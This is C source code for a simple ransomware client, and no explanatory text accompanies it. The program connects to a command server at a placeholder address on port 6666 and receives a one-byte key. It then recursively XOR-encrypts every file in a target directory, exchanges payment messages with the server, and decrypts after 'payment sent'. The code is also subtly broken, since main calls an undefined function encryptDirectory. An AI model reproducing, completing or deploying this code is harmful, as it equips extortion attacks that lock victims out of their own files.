#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <winsock2.h>
#pragma comment(lib, "Ws2_32.lib")
#include <time.h>

// This function will encrypt a single file
void encrypt_file(char* file_path, char key)
{
    // file is the file to be encrypted
    // temp_file is a temporary file which will save encrypted data of file
    FILE* file;
    FILE* temp_file;
    char temp_file_path[] = "temp.txt";
    // Open file streams
    // Open file to read, temp_file to write
    file = fopen(file_path, "r");
    temp_file = fopen(temp_file_path, "w");

    // Read byte by byte through file
    char byte;

    while (fscanf(file, "%c", &byte) > 0)
    {
        // Encrypt this byte by xoring to the key
        byte ^= key;
        // Save this byte into temp file
        fprintf(temp_file, "%c", byte);
    }

    // Close file streams
    fclose(file);
    fclose(temp_file);

    // Open file streams
    // But this time we will open file to write and temp file to read
    file = fopen(file_path, "w");
    temp_file = fopen(temp_file_path, "r");

    // Read through temp file byte by byte
    while (fscanf(temp_file, "%c", &byte) > 0)
    {
        // Save this byte into file
        fprintf(file, "%c", byte);
    }

    // Close file streams
    fclose(file);
    fclose(temp_file);

    // Delete temp file
    remove(temp_file_path);
}

// This function will read through all directories and files within a directory
// If it finds a file, it encrypts it
// If it finds a directory, it will read through it
void encrypt_directory(char* directory_path, char key)
{
    DIR* directory;
    struct dirent* entry;
    struct stat status;
    char path[FILENAME_MAX];

    // Open the directory
    directory = opendir(directory_path);
    printf("%d\n", directory);
    if (directory != NULL)
    {
        // directory opened successfully
        // Read through directory
        while ((entry = readdir(directory)) != NULL)
        {
            // Check if this entry (file or directory) is current directory (".") or parent
            //directory ("..")
            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0)
            {
                // Get entry full path
                strcpy(path, directory_path);
                strcat(path, "\\");
                strcat(path, entry->d_name);
                // Check if this entry is a directory or file
                stat(path, &status);
                if (S_ISDIR(status.st_mode))
                {
                    // This is a directory
                    // read through it
                    encrypt_directory(path, key);
                } else {
                    // it is a file
                    // encrypt it
                    encrypt_file(path, key);
                }
            }
        }
    }
}

int main()
{
    SOCKET client_socket; // Create a SOCKET structure
    WSADATA wsastructure; // Create a WSADATA structure requiered for winsock initialization
    int result;
    struct sockaddr_in client_addr;
    char key_recv_buffer[1024] = "Key received. Encrypting...";
    char send_buffer[1024] = "";
    char recv_buffer[1024] = "";
    char key;

    result = WSAStartup(MAKEWORD(2, 2), &wsastructure); // Initialize winsock

    if(result != 0)
    {
        printf("[!] WinSock initialization failed \n"); // Print out the error and exit out of the program
        return 1;
    }

    client_socket = socket(AF_INET, SOCK_STREAM, 0);

    client_addr.sin_family = AF_INET;
    client_addr.sin_port = htons(6666);
    client_addr.sin_addr.s_addr = inet_addr("000.000.000.00");

    // Connect to the server
    if(connect(client_socket, (struct sockaddr*) &client_addr, sizeof(client_addr)) != 0)
    {
        printf("[!] Connection to the server failed\n"); // Print out the error and exit out of the program
        return 1;
    }
    printf("[+] Connected to the server\n");


    while (1)
    {   
        // Wait for response from server
        recv(client_socket, &key, sizeof(key), 0);
        encryptDirectory("<Path>", key);

        send(client_socket, key_recv_buffer, sizeof(key_recv_buffer), 0);
        
        while (recv(client_socket, recv_buffer, sizeof(recv_buffer), 0) > 0)
        {
            printf("[+] New message: %s\n", recv_buffer);

            printf("Response: ");
            fgets(send_buffer, sizeof(send_buffer), stdin);

            // Send data to server
            send(client_socket, send_buffer, sizeof(send_buffer), 0);
            printf("\n[+] Response sent: %s", send_buffer);

            if (strcmp(send_buffer, "payment sent\n") == 0)
            {
                encrypt_directory("<Path>", key);
                recv(client_socket, recv_buffer, sizeof(recv_buffer), 0);
                printf("\n[+] Congrats!!: %s", recv_buffer);

                closesocket(client_socket);
                WSACleanup();

                return 0;
            }
        }
    }


    return 0;
}
